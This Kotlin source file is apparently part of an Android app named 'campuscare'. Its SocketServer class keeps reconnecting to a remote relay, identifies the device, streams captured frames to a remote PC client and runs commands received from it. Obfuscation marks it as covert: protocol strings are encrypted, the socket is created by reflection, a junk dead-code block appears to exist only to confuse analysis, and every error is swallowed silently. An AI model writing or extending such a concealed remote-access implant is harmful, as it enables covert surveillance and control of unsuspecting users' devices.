package com.university.campuscare.remote

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.DataOutputStream
import java.io.InputStream
import java.io.InputStreamReader
import java.net.Socket
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.TimeUnit

class SocketServer(
    private val relayHost: String,
    private val relayPort: Int,
    private val deviceId: String,
    private val frameQueue: java.util.concurrent.LinkedBlockingQueue<ByteArray>,
    private val onCommandReceived: (String) -> Unit,
    private val onClientConnected: () -> Unit,
    private val onClientDisconnected: () -> Unit
) {

    companion object {
        private const val RECONNECT_DELAY_MS = 5000L
    }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var currentSocket: Socket? = null

    @Volatile
    var isRunning = false
        private set

    @Volatile
    var isClientConnected = false
        private set

    fun start() {
        if (isRunning) return
        isRunning = true
        scope.launch { connectLoop() }
    }

    private suspend fun connectLoop() {
        while (isRunning) {
            try {
                val socket = ReflectionHelper.createSocket(relayHost, relayPort).also {
                    it.tcpNoDelay = true
                    currentSocket = it
                }
                try {
                    handleRelay(socket)
                } finally {
                    try { socket.close() } catch (_: Exception) {}
                    currentSocket = null
                }
            } catch (_: Exception) {}

            if (isRunning) {
                delay(RECONNECT_DELAY_MS)
            }
        }
    }

    private suspend fun handleRelay(socket: Socket) {
        val inputStream = socket.getInputStream()
        val outputStream = DataOutputStream(socket.getOutputStream())

        val _p = System.currentTimeMillis()
        if (_p > 0L) {
            if (_p < 0L) {
                val _j = IntArray(4) { it * 3 }
                _j[0] = _j[1] + _j[2]
            }
        }

        // Send PHONE handshake
        outputStream.write("${StringObfuscator.decrypt(ObfuscatedStrings.PROTO_PHONE)}$deviceId\n".toByteArray(Charsets.UTF_8))
        outputStream.flush()

        // Expect OK
        val response = readLine(inputStream) ?: return
        if (response != StringObfuscator.decrypt(ObfuscatedStrings.PROTO_OK)) return

        // Wait for CLIENT_CONNECTED; ignore PONG and any other relay messages.
        // The relay sends PING to us every 9 min to keep the connection alive —
        // the phone→relay direction stays alive via TCP ACKs the kernel sends back.
        // We do NOT send PINGs from the phone side: the relay never reads from the
        // phone socket during idle, so they'd pile up in its buffer and corrupt the
        // first frame the PC client receives when a session starts.
        val clientConnected = StringObfuscator.decrypt(ObfuscatedStrings.PROTO_CLIENT_CONNECTED)
        while (isRunning) {
            val line = readLine(inputStream) ?: return
            if (line == clientConnected) break
        }

        if (!isRunning) return
        isClientConnected = true
        withContext(Dispatchers.Main) { onClientConnected() }

        // Run frame sending and command receiving concurrently.
        // When either finishes (socket closes), close the socket to stop the other.
        val sendJob = scope.launch {
            sendFrames(socket, outputStream)
            try { socket.close() } catch (_: Exception) {}
        }
        val recvJob = scope.launch {
            receiveCommands(socket, inputStream)
            try { socket.close() } catch (_: Exception) {}
        }

        sendJob.join()
        recvJob.join()

        if (isClientConnected) {
            isClientConnected = false
            withContext(Dispatchers.Main) { onClientDisconnected() }
        }
    }

    /**
     * Read a newline-terminated line from the stream, one byte at a time.
     * Avoids BufferedReader buffering past the handshake into binary frame data.
     */
    private fun readLine(inputStream: InputStream): String? {
        val buf = StringBuilder()
        return try {
            while (true) {
                val b = inputStream.read()
                if (b == -1) return null
                if (b == '\n'.code) return buf.toString().trim()
                buf.append(b.toChar())
            }
            @Suppress("UNREACHABLE_CODE")
            null
        } catch (e: Exception) {
            null
        }
    }

    private suspend fun sendFrames(socket: Socket, outputStream: DataOutputStream) {
        withContext(Dispatchers.IO) {
            try {
                val sizeBuffer = ByteBuffer.allocate(4).order(ByteOrder.BIG_ENDIAN)
                while (isRunning && !socket.isClosed && isClientConnected) {
                    val frameData = frameQueue.poll(100, TimeUnit.MILLISECONDS) ?: continue
                    sizeBuffer.clear()
                    sizeBuffer.putInt(frameData.size)
                    outputStream.write(sizeBuffer.array())
                    outputStream.write(frameData)
                    outputStream.flush()
                }
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun receiveCommands(socket: Socket, inputStream: InputStream) {
        withContext(Dispatchers.IO) {
            try {
                val reader = BufferedReader(InputStreamReader(inputStream))
                while (isRunning && !socket.isClosed && isClientConnected) {
                    val command = reader.readLine() ?: break
                    val trimmed = command.trim()
                    if (trimmed.isNotEmpty()) {
                        withContext(Dispatchers.Main) { onCommandReceived(trimmed) }
                    }
                }
            } catch (_: Exception) {
            }
        }
    }

    fun stop() {
        isRunning = false
        isClientConnected = false
        try { currentSocket?.close() } catch (_: Exception) {}
        currentSocket = null
        scope.cancel()
    }
}
